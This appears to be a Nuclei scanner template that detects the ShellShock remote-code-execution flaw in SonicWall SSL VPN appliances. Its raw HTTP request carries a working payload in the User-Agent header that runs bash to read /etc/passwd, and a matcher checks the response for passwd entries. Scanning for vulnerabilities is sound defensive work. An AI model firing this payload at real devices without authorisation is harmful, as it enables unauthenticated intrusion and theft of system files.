http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/jarrewrite.sh HTTP/1.1

    Host: {{Hostname}}

    User-Agent: "() { :; }; echo ; /bin/bash -c ''cat /etc/passwd''"

    Accept: */*

    '
id: sonicwall-sslvpn-shellshock
info:
  author: PR3R00T
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Sonicwall SSLVPN contains a ''ShellShock'' vulnerability which allows
    remote unauthenticated attackers to execute arbitrary commands.

    '
  metadata:
    max-request: 1
  name: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
  reference:
  - https://twitter.com/chybeta/status/1353974652540882944
  - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
  severity: critical
  tags: shellshock,sonicwall,rce,vpn,vuln
